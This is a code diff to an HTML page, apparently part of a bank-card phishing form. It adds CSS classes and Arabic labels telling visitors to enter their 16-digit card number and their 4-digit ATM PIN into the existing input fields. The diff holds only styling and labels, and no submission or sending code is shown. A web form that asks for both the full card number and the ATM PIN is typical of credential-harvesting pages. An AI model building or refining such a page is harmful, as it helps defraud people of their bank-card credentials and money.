@@ -242,6 +242,15 @@
             margin-bottom: 22px;
             direction: ltr;
         }
+        .card-num-label {
+            color: #fff;
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 5px;
+            margin-top: 0;
+            letter-spacing: 1px;
+        }
         .card-num-input {
             width: 54px;
             height: 44px;
@@ -263,6 +272,15 @@
             gap: 10px;
             margin-bottom: 16px;
             margin-top: 0;
+        }
+        .card-secret-label {
+            color: #fff;
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            margin-top: 16px;
+            letter-spacing: 1px;
         }
         .card-secret-input {
             width: 42px;
@@ -412,6 +430,7 @@
         <!-- Card Info View (ATM Card, improved) -->
         <div class="view" id="cardInfoView">
             <div class="card-info-title">بطاقة الصراف الآلي</div>
+            <div class="card-num-label">ادخل رقم البطاقة من 16 رقم</div>
             <div class="card-img-wrap">
                 <div class="card-img">
                     <div class="card-img-content">
@@ -428,6 +447,7 @@
                     <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off" inputmode="numeric">
                     <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off" inputmode="numeric">
                 </div>
+                <div class="card-secret-label">ادخل الرقم السري 4 خانات</div>
                 <div class="card-secret-row">
                     <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret1" name="cardSecret1" autocomplete="off" inputmode="numeric">
                     <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret2" name="cardSecret2" autocomplete="off" inputmode="numeric">
